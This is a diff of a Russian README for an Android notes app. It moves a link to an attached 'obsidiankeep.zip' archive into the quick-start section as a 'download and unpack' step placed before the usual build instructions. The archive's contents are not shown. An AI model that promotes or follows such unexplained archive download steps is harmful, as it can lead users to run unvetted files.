@@ -7,7 +7,6 @@
 литералы и KDoc. Визуальный язык повторяет веб-live-view: тёмная тема
 по умолчанию, нейтральный цинк + фиолетовый акцент, карточки с цветной
 подложкой, чипы и bottom-sheet выборы.
-[obsidiankeep.zip](https://github.com/user-attachments/files/33249157/obsidiankeep.zip)
 
 ## Возможности
 
@@ -38,6 +37,8 @@
   клавиатура не перекрывает редактор), иконка приложения в res/mipmap
 
 ## Быстрый старт
+
+Скачайте [obsidiankeep.zip](https://github.com/user-attachments/files/33249157/obsidiankeep.zip) и распакуйте
 
 1. Android Studio → File → Open → папка проекта → дождаться синхронизации → Run ▶
    или в терминале: `./gradlew assembleDebug`
